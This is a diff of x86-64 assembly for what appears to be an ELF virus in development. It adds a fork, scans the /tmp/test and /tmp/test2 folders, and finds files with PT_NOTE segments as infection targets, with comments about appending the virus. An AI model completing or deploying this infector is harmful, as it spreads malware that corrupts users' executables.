@@ -12,7 +12,12 @@ section .text
     global _start
 
 _start:
-    mov r14, [rsp + 8] ; argv0
+    mov rax, 57
+    syscall
+
+    test rax, rax
+    jnz exit_success
+
     push rdx
     push rbp           ; save the base pointer
     mov rbp, rsp       ; set the base pointer to the current stack pointer
@@ -21,14 +26,17 @@ _start:
 
     lea rdi, [rel folder1] ; rdi = "/tmp/test"
     call chdir ; change directory to "/tmp/test"
-
     call open_dir ; change directory to "/tmp/test"
-
     call getdents
-
     xor rcx, rcx ; rcx = 0
+    call iterate_loop ; iterate over directory entries
 
-
+    ; this is supposed to work properly
+    lea rdi, [rel folder2] ; rdi = "/tmp/test2"
+    call chdir ; change directory to "/tmp/test2"
+    call open_dir ; change directory to "/tmp/test2"
+    call getdents
+    xor rcx, rcx ; rcx = 0
     call iterate_loop ; iterate over directory entries
 
     call restore_stack ; exit
@@ -111,9 +119,7 @@ iterate_loop:
     cmp rax, 2 ; check if it's a PT_NOTE segment
     jne .close_file ; if not, go to next entry
 
-
     call hello_world  ; print "Hello, World!"
-
 
     ; infect
         ; for infection i must append virus to the file, then i must
@@ -235,7 +241,6 @@ restore_stack:
     mov rsp, rbp       ; restore the stack pointer
     pop rbp            ; restore the base pointer
     pop rdx            ; restore rdx
-    jmp _end           ; jump to _end to exit
 
 exit_success:
     xor rdi, rdi
